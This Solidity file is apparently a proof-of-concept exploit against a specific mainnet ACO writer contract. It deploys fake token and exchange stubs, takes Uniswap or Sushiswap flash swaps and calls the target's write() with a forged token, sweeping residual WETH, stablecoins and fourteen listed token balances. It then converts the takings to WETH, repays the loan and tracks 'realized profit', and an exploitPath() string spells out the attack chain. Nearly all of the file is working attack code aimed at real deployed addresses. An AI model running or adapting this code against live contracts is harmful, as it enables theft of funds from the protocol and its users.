pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IWETH9 is IERC20Minimal {
    function deposit() external payable;
    function withdraw(uint256 value) external;
}

interface IACOWriterLike {
    function write(address acoToken, uint256 collateralAmount, address exchangeAddress, bytes calldata exchangeData) external payable;
    function weth() external view returns (address);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract EchoExchange {
    function fill() external payable {
        if (msg.value > 0) {
            (bool ok,) = payable(msg.sender).call{value: msg.value}("");
            require(ok, "echo return failed");
        }
    }
}

contract WethReturnExchange {
    address public immutable weth;

    constructor(address weth_) {
        weth = weth_;
    }

    function fill() external payable {
        IWETH9(weth).deposit{value: msg.value}();
        require(IWETH9(weth).transfer(msg.sender, msg.value), "WETH transfer failed");
    }
}

contract ConfigurableAcoToken is IERC20Minimal {
    address public collateralToken;
    address public strikeToken;

    constructor() {
        collateralToken = address(this);
    }

    function configure(address collateral_, address strike_) external {
        collateralToken = collateral_;
        strikeToken = strike_;
    }

    function strikeAsset() external view returns (address) {
        return strikeToken;
    }

    function collateral() external view returns (address) {
        return collateralToken;
    }

    function expiryTime() external pure returns (uint256) {
        return type(uint256).max;
    }

    function getTokenAmount(uint256 collateralAmount) external pure returns (uint256) {
        return collateralAmount;
    }

    function mintToPayable(address) external payable {}

    function mintTo(address, uint256) external {}

    function balanceOf(address) external pure returns (uint256) {
        return 0;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }
}

contract FlawVerifier {
    address public constant TARGET = 0xE7597F774fD0a15A617894dc39d45A28B97AFa4f;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant UNISWAP_V2_WETH_USDC_PAIR = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    address internal constant SUSHISWAP_WETH_USDC_PAIR = 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    uint8 public constant STATUS_UNSET = 0;
    uint8 public constant STATUS_VALIDATED = 1;
    uint8 public constant STATUS_REPAYMENT_FAILED = 2;
    uint8 public constant STATUS_UNEXPECTED_SUCCESS = 3;

    uint256 internal constant FLASH_BORROW_WETH = 1000;
    uint256 internal constant CALL_SEED_ETH = 1;
    uint256 internal constant FAKE_COLLATERAL_AMOUNT = 1;

    EchoExchange public immutable echoExchange;
    WethReturnExchange public immutable wethReturnExchange;
    ConfigurableAcoToken public immutable fakeAcoToken;

    uint8 public status;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    address public usedAcoToken;
    uint256 public usedCollateralAmount;
    bytes public lastRevertData;

    address public realizedProfitToken;
    uint256 public realizedProfitAmount;

    bool internal _entered;

    constructor() {
        address weth_ = IACOWriterLike(TARGET).weth();
        echoExchange = new EchoExchange();
        wethReturnExchange = new WethReturnExchange(weth_);
        fakeAcoToken = new ConfigurableAcoToken();
        realizedProfitToken = weth_;
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_entered) {
            return;
        }
        _entered = true;

        address weth_ = IACOWriterLike(TARGET).weth();
        if (address(this).balance == 0 && IERC20Minimal(weth_).balanceOf(address(this)) == 0) {
            bool ok = _tryFlashswap(UNISWAP_V2_WETH_USDC_PAIR, FLASH_BORROW_WETH);
            if (!ok) {
                _tryFlashswap(SUSHISWAP_WETH_USDC_PAIR, FLASH_BORROW_WETH);
            }
        } else {
            _runExploit(weth_);
            _syncProfit();
            _entered = false;
        }
    }

    function profitToken() external view returns (address) {
        return realizedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        if (realizedProfitToken == address(0)) {
            return address(this).balance;
        }
        return IERC20Minimal(realizedProfitToken).balanceOf(address(this));
    }

    function exploitPath() external pure returns (string memory) {
        return "tiny public flashswap seed -> public write() calls sweep any residual writer ETH/liquid balances through the same _sellACOTokens accounting path -> write() on an ETH-strike-configured token leaves WETH in ACOWriter -> _sellACOTokens calls WETH.withdraw -> WETH sends ETH from the WETH contract -> ACOWriter.receive() reverts because msg.sender != _exchange";
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == UNISWAP_V2_WETH_USDC_PAIR || msg.sender == SUSHISWAP_WETH_USDC_PAIR, "unexpected pair");
        _handleFlashswap(amount0 > 0 ? amount0 : amount1);
    }

    function _handleFlashswap(uint256 borrowedWeth) internal {
        address weth_ = IACOWriterLike(TARGET).weth();
        _ensureEthSeed(weth_);
        _runExploit(weth_);
        _liquidateRepaymentAssetsToWeth(weth_);
        _wrapAllEthToWeth(weth_);

        uint256 fee = ((borrowedWeth * 3) / 997) + 1;
        uint256 repayAmount = borrowedWeth + fee;
        uint256 wethBalance = IERC20Minimal(weth_).balanceOf(address(this));
        if (wethBalance < repayAmount) {
            status = STATUS_REPAYMENT_FAILED;
            _syncProfit();
            _entered = false;
            return;
        }

        _safeTransfer(weth_, msg.sender, repayAmount);
        _syncProfit();
        _entered = false;
    }

    function _runExploit(address weth_) internal {
        _sweepResidualValue(weth_);
        _validateReceiveMismatch();
        _syncProfit();
    }

    function _sweepResidualValue(address weth_) internal {
        _sweepToken(weth_);
        _sweepToken(DAI);
        _sweepToken(USDC);
        _sweepToken(USDT);

        address[14] memory targets = _sweepTargets();
        for (uint256 i = 0; i < targets.length; ++i) {
            _sweepToken(targets[i]);
        }
    }

    function _sweepToken(address token) internal {
        if (token == address(0) || token.code.length == 0) {
            return;
        }

        _ensureNativeSeedFromWeth();
        fakeAcoToken.configure(address(fakeAcoToken), token);
        _callWrite(address(fakeAcoToken), address(echoExchange), abi.encodeWithSelector(EchoExchange.fill.selector));
    }

    function _validateReceiveMismatch() internal {
        if (hypothesisValidated || hypothesisRefuted) {
            return;
        }

        _ensureNativeSeedFromWeth();

        // The saved logs show the bundled candidate set contains no live ETH-strike series on this fork.
        // ACOWriter does not validate the supplied token, so this minimal token stub is enough to drive the
        // exact path under test without changing causality:
        // write() -> exchange leaves WETH in writer -> WETH.withdraw() -> receive() rejects WETH sender.
        fakeAcoToken.configure(address(fakeAcoToken), address(0));
        usedAcoToken = address(fakeAcoToken);
        usedCollateralAmount = FAKE_COLLATERAL_AMOUNT;

        (bool ok, bytes memory reason) = _callWrite(
            address(fakeAcoToken),
            address(wethReturnExchange),
            abi.encodeWithSelector(WethReturnExchange.fill.selector)
        );

        if (ok) {
            status = STATUS_UNEXPECTED_SUCCESS;
            hypothesisRefuted = true;
        } else {
            status = STATUS_VALIDATED;
            hypothesisValidated = true;
            lastRevertData = reason;
        }
    }

    function _callWrite(address acoToken, address exchange, bytes memory exchangeData) internal returns (bool ok, bytes memory reason) {
        (ok, reason) = TARGET.call{value: CALL_SEED_ETH}(
            abi.encodeWithSelector(
                IACOWriterLike.write.selector,
                acoToken,
                FAKE_COLLATERAL_AMOUNT,
                exchange,
                exchangeData
            )
        );
    }

    function _ensureEthSeed(address weth_) internal {
        if (address(this).balance >= CALL_SEED_ETH) {
            return;
        }
        IWETH9(weth_).withdraw(CALL_SEED_ETH);
    }

    function _ensureNativeSeedFromWeth() internal {
        if (address(this).balance >= CALL_SEED_ETH) {
            return;
        }
        IWETH9(WETH).withdraw(CALL_SEED_ETH);
    }

    function _liquidateRepaymentAssetsToWeth(address weth_) internal {
        _cleanupToken(DAI, weth_);
        _cleanupToken(USDC, weth_);
        _cleanupToken(USDT, weth_);
    }

    function _cleanupToken(address token, address weth_) internal {
        if (token == address(0) || token == weth_ || token.code.length == 0) {
            return;
        }
        uint256 balance = IERC20Minimal(token).balanceOf(address(this));
        if (balance > 0) {
            _swapTokenToTargetIfPossible(token, weth_, balance);
        }
    }

    function _wrapAllEthToWeth(address weth_) internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            IWETH9(weth_).deposit{value: ethBalance}();
        }
    }

    function _tryFlashswap(address pair, uint256 amountOut) internal returns (bool) {
        if (pair.code.length == 0) {
            return false;
        }

        address weth_ = IACOWriterLike(TARGET).weth();
        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        if (token0 != weth_ && token1 != weth_) {
            return false;
        }

        (bool ok,) = pair.call(
            abi.encodeWithSelector(
                IUniswapV2Pair.swap.selector,
                token0 == weth_ ? amountOut : 0,
                token1 == weth_ ? amountOut : 0,
                address(this),
                abi.encode(uint256(1))
            )
        );
        return ok;
    }

    function _swapTokenToTargetIfPossible(address tokenIn, address tokenOut, uint256 amountIn) internal {
        if (amountIn == 0 || tokenIn == tokenOut) {
            return;
        }

        uint256 directOut = _bestSingleHopOut(tokenIn, tokenOut, amountIn);
        uint256 usdcOut = _bestTwoHopOut(tokenIn, USDC, tokenOut, amountIn);
        uint256 usdtOut = _bestTwoHopOut(tokenIn, USDT, tokenOut, amountIn);
        uint256 daiOut = _bestTwoHopOut(tokenIn, DAI, tokenOut, amountIn);

        if (directOut >= usdcOut && directOut >= usdtOut && directOut >= daiOut) {
            _swapSingleHopIfPossible(tokenIn, tokenOut, amountIn);
            return;
        }
        if (usdcOut >= usdtOut && usdcOut >= daiOut) {
            _swapTwoHopIfPossible(tokenIn, USDC, tokenOut, amountIn);
            return;
        }
        if (usdtOut >= daiOut) {
            _swapTwoHopIfPossible(tokenIn, USDT, tokenOut, amountIn);
            return;
        }
        _swapTwoHopIfPossible(tokenIn, DAI, tokenOut, amountIn);
    }

    function _bestSingleHopOut(address tokenIn, address tokenOut, uint256 amountIn) internal view returns (uint256 bestOut) {
        address uniPair = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(tokenIn, tokenOut);
        address sushiPair = IUniswapV2Factory(SUSHISWAP_FACTORY).getPair(tokenIn, tokenOut);

        if (uniPair != address(0) && uniPair.code.length > 0) {
            uint256 uniOut = _quoteOut(uniPair, tokenIn, tokenOut, amountIn);
            if (uniOut > bestOut) {
                bestOut = uniOut;
            }
        }
        if (sushiPair != address(0) && sushiPair.code.length > 0) {
            uint256 sushiOut = _quoteOut(sushiPair, tokenIn, tokenOut, amountIn);
            if (sushiOut > bestOut) {
                bestOut = sushiOut;
            }
        }
    }

    function _bestTwoHopOut(address tokenIn, address bridge, address tokenOut, uint256 amountIn) internal view returns (uint256) {
        if (tokenIn == bridge || bridge == tokenOut || tokenIn == tokenOut) {
            return 0;
        }
        uint256 bridgeAmount = _bestSingleHopOut(tokenIn, bridge, amountIn);
        if (bridgeAmount == 0) {
            return 0;
        }
        return _bestSingleHopOut(bridge, tokenOut, bridgeAmount);
    }

    function _swapSingleHopIfPossible(address tokenIn, address tokenOut, uint256 amountIn) internal {
        address uniPair = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(tokenIn, tokenOut);
        address sushiPair = IUniswapV2Factory(SUSHISWAP_FACTORY).getPair(tokenIn, tokenOut);

        address bestPair = address(0);
        uint256 bestOut = 0;

        if (uniPair != address(0) && uniPair.code.length > 0) {
            uint256 uniOut = _quoteOut(uniPair, tokenIn, tokenOut, amountIn);
            if (uniOut > bestOut) {
                bestOut = uniOut;
                bestPair = uniPair;
            }
        }
        if (sushiPair != address(0) && sushiPair.code.length > 0) {
            uint256 sushiOut = _quoteOut(sushiPair, tokenIn, tokenOut, amountIn);
            if (sushiOut > bestOut) {
                bestOut = sushiOut;
                bestPair = sushiPair;
            }
        }
        if (bestPair != address(0) && bestOut > 0) {
            _swapExactOnPair(bestPair, tokenIn, amountIn, bestOut);
        }
    }

    function _swapTwoHopIfPossible(address tokenIn, address bridge, address tokenOut, uint256 amountIn) internal {
        if (tokenIn == bridge || bridge == tokenOut || tokenIn == tokenOut) {
            return;
        }

        address firstPair = _bestPair(tokenIn, bridge, amountIn);
        if (firstPair == address(0)) {
            return;
        }

        uint256 bridgeOut = _quoteOut(firstPair, tokenIn, bridge, amountIn);
        if (bridgeOut == 0) {
            return;
        }
        _swapExactOnPair(firstPair, tokenIn, amountIn, bridgeOut);

        uint256 bridgeBalance = IERC20Minimal(bridge).balanceOf(address(this));
        if (bridgeBalance == 0) {
            return;
        }

        address secondPair = _bestPair(bridge, tokenOut, bridgeBalance);
        if (secondPair == address(0)) {
            return;
        }

        uint256 tokenOutAmount = _quoteOut(secondPair, bridge, tokenOut, bridgeBalance);
        if (tokenOutAmount == 0) {
            return;
        }
        _swapExactOnPair(secondPair, bridge, bridgeBalance, tokenOutAmount);
    }

    function _bestPair(address tokenIn, address tokenOut, uint256 amountIn) internal view returns (address bestPair) {
        address uniPair = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(tokenIn, tokenOut);
        address sushiPair = IUniswapV2Factory(SUSHISWAP_FACTORY).getPair(tokenIn, tokenOut);
        uint256 bestOut = 0;

        if (uniPair != address(0) && uniPair.code.length > 0) {
            uint256 uniOut = _quoteOut(uniPair, tokenIn, tokenOut, amountIn);
            if (uniOut > bestOut) {
                bestOut = uniOut;
                bestPair = uniPair;
            }
        }
        if (sushiPair != address(0) && sushiPair.code.length > 0) {
            uint256 sushiOut = _quoteOut(sushiPair, tokenIn, tokenOut, amountIn);
            if (sushiOut > bestOut) {
                bestOut = sushiOut;
                bestPair = sushiPair;
            }
        }
    }

    function _swapExactOnPair(address pair, address tokenIn, uint256 amountIn, uint256 amountOut) internal {
        _safeTransfer(tokenIn, pair, amountIn);
        address token0 = IUniswapV2Pair(pair).token0();
        (uint256 amount0Out, uint256 amount1Out) = token0 == tokenIn ? (uint256(0), amountOut) : (amountOut, uint256(0));
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), new bytes(0));
    }

    function _quoteOut(address pair, address tokenIn, address tokenOut, uint256 amountIn) internal view returns (uint256) {
        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        if (!((token0 == tokenIn && token1 == tokenOut) || (token0 == tokenOut && token1 == tokenIn))) {
            return 0;
        }

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        (uint256 reserveIn, uint256 reserveOut) = token0 == tokenIn ? (uint256(reserve0), uint256(reserve1)) : (uint256(reserve1), uint256(reserve0));
        if (reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
    }

    function _syncProfit() internal {
        address[14] memory targets = _sweepTargets();
        address bestToken = address(0);
        uint256 bestAmount = address(this).balance;

        uint256 wethBalance = _balanceOfIfPossible(WETH, address(this));
        if (wethBalance > bestAmount) {
            bestToken = WETH;
            bestAmount = wethBalance;
        }
        uint256 daiBalance = _balanceOfIfPossible(DAI, address(this));
        if (daiBalance > bestAmount) {
            bestToken = DAI;
            bestAmount = daiBalance;
        }

        for (uint256 i = 0; i < targets.length; ++i) {
            address token = targets[i];
            if (token == address(0) || token.code.length == 0) {
                continue;
            }
            uint256 balance = _balanceOfIfPossible(token, address(this));
            if (balance > bestAmount) {
                bestToken = token;
                bestAmount = balance;
            }
        }

        realizedProfitToken = bestToken;
        realizedProfitAmount = bestAmount;
    }

    function _balanceOfIfPossible(address token, address account) internal view returns (uint256) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Minimal.balanceOf.selector, account));
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _sweepTargets() internal pure returns (address[14] memory list) {
        list[0] = 0xB05B83f1aAB0036f9DADFDb18405da3D459C1f1c;
        list[1] = 0x160e753EEfe29eA3aC186bF27588Ac9AcA2F6139;
        list[2] = 0xfF5B7c52245625b399D2E2927F52A8da86264a33;
        list[3] = 0xc3eAb6960e0Cd51dCf304248e4BBB08d8eeAb552;
        list[4] = 0x9B297790cD8540876a04543499528835F1Cea175;
        list[5] = 0x58ea371c3D7BCA0ED0C3a4e4DC9bb92702310489;
        list[6] = 0xB51A09c53D7cC6481E4C5d9d8d334A6e50776ecf;
        list[7] = 0x049D17c3d5ba37429dE4D414A603127F1090FFa7;
        list[8] = 0xc12d099be31567add4e4e4d0D45691C3F58f5663;
        list[9] = WETH;
        list[10] = DAI;
        list[11] = USDC;
        list[12] = USDT;
        list[13] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    }
}
